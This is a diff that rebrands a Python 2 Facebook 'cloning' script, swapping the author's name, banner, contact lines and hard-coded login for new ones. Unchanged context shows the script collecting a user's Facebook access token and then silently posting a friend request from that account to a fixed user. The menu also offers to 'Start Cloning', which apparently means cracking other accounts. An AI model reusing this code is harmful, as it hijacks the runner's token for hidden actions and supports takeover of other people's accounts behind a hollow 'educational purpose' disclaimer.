@@ -1,11 +1,11 @@
 #!/usr/bin/python2
 #coding=utf-8
-#Codded By SHAHAB ZAMAN
+#Codded By abid Hussain kashmiri hacker
 #Editing My Script Will Not Make You A Coder
-#Facebook : Saabkabbaaphere
-#Whatsapp : ++923348772559
+#Facebook : no ACCOUNT
+#Whatsapp : no whatsapp
 #Pakistan Cyber Expert
-#Alone Coder 
+#Alone Coder dcoder
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
@@ -52,19 +52,38 @@ def jalan(z):
 logo ="""
 
 
-\x1b[1;96m██████╗░░█████╗░███╗░░██╗░██████╗░░█████╗░░██████╗████████╗███████╗░█████╗░██╗░░██╗
-\x1b[1;96m██╔══██╗██╔══██╗████╗░██║██╔════╝░██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░██║
-\x1b[1;96m██████╦╝███████║██╔██╗██║██║░░██╗░███████║╚█████╗░░░░██║░░░█████╗░░██║░░╚═╝███████║
-\x1b[1;96m██╔══██╗██╔══██║██║╚████║██║░░╚██╗██╔══██║░╚═══██╗░░░██║░░░██╔══╝░░██║░░██╗██╔══██║
-\x1b[1;96m██████╦╝██║░░██║██║░╚███║╚██████╔╝██║░░██║██████╔╝░░░██║░░░███████╗╚█████╔╝██║░░██║
-\x1b[1;96m╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░╚══════╝░╚════╝░╚═╝░░╚═╝
+\x1b[1;96m
+
+░██████╗██╗░░██╗░█████╗░██████╗░░█████╗░░██╗░░░░░░░██╗
+
+██╔════╝██║░░██║██╔══██╗██╔══██╗██╔══██╗░██║░░██╗░░██║
+
+╚█████╗░███████║███████║██║░░██║██║░░██║░╚██╗████╗██╔╝
+
+░╚═══██╗██╔══██║██╔══██║██║░░██║██║░░██║░░████╔═████║░
+
+██████╔╝██║░░██║██║░░██║██████╔╝╚█████╔╝░░╚██╔╝░╚██╔╝░
+
+╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝░░
+
+██╗░░██╗░█████╗░░█████╗░██╗░░██╗███████╗██████╗░
+
+██║░░██║██╔══██╗██╔══██╗██║░██╔╝██╔════╝██╔══██╗
+
+███████║███████║██║░░╚═╝█████═╝░█████╗░░██████╔╝
+
+██╔══██║██╔══██║██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
+
+██║░░██║██║░░██║╚█████╔╝██║░╚██╗███████╗██║░░██║
+
+╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
 \x1b[1;97m--------------------------------------------------------------
-\x1b[1;94m➣  YouTube  : BANGASH TECH
-\x1b[1;94m➣  Facebook : SaabkaBaapHere
+\x1b[1;94m➣  YouTube  : Master In Ethical Hacking
+\x1b[1;94m➣  Facebook : error not found
 \x1b[1;94m➣  Note     : Dont ReEdit It 
-\x1b[1;94m➣  Github   : https://github.com/bangashtech
-\x1b[1;94m➣  Whatsapp : +9233487725594
-\x1b[1;94m➣  Note     : Having Problem? Contact Me On Facebook Or Whatsapp.
+\x1b[1;94m➣  Github   : https://github.com/abi creation
+\x1b[1;94m➣  Whatsapp : no whatsapp
+\x1b[1;94m➣  Note     : Having Problem? Contact Me On your dream
 \x1b[1;94m➣  Disclamiar : This Is For Educational Purpose Only. 
 \x1b[1;94m➣  Disclamiar : Iam Not Responsible For Any Illegal Use Or Activity.
 \x1b[1;97m--------------------------------------------------------------"""
@@ -85,8 +104,8 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print logo
 
-CorrectUsername = "bangash"
-CorrectPassword = "tech"
+CorrectUsername = "black"
+CorrectPassword = "hacker"
 
 loop = 'true'
 while (loop == 'true'):
@@ -99,10 +118,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;97mACCESS DENIED"
-            os.system('xdg-open https://www.youtube.com/watch?v=hc8nJfdZwyk')
+            os.system('xdg-open https://www.youtube.com/UCDKRvmw7ufXejkYXG51liKA')
     else:
         print "\033[1;97mACCESS DENIED"
-        os.system('xdg-open https://www.youtube.com/watch?v=hc8nJfdZwyk')
+        os.system('xdg-open https://www.youtube.com/UCDKRvmw7ufXejkYXG51liKA')
 def login():
 	os.system('clear')
 	try:
@@ -114,7 +133,7 @@ def login():
      	
 		
 		jalan(' \033[1;97m   ✧ \033[1;97mWarning: \033[1;97mUse a New Account To Login' )
-		jalan(' \033[1;97m   ✧ \033[1;97m👉 : \033[1;97mSHAHAB King Of Facebook' ) 
+		jalan(' \033[1;97m   ✧ \033[1;97m👉 : \033[1;97merror not found' ) 
 		
 		print('	' )
 		print('      \033[1;97m      ✧ \x1b[1;97mLogin With Facebook\x1b[1;97m ✧')
@@ -147,7 +166,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;97mSuccessfully Logged In'
-				os.system('xdg-open https://www.youtube.com/watch?v=hc8nJfdZwyk')
+				os.system('xdg-open https://www.youtube.com/UCDKRvmw7ufXejkYXG51liKA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -197,7 +216,7 @@ def menu():
 	
 	print "\033[1;97m---------------------------------------------------------"
 		
-	print "\033[1;97m✧\033[1;97m.\033[1;97m1.\x1b[1;97mShahab Start Cloning..."
+	print "\033[1;97m✧\033[1;97m.\033[1;97m1.\x1b[1;97mshadow  Start Cloning..."
       
         
         print "\033[1;97m✧\033[1;97m.\033[1;97m2.\033[1;97m Follow Me On YouTube For Help"
@@ -212,7 +231,7 @@ def hop():
 	elif hack =="1":
 		super()
 	elif hack =="2":
-	        os.system('xdg-open https://www.youtube.com/watch?v=hc8nJfdZwyk')
+	        os.system('xdg-open https://www.youtube.com/UCDKRvmw7ufXejkYXG51liKA')
 	        menu()
         
 	elif hack =="0":
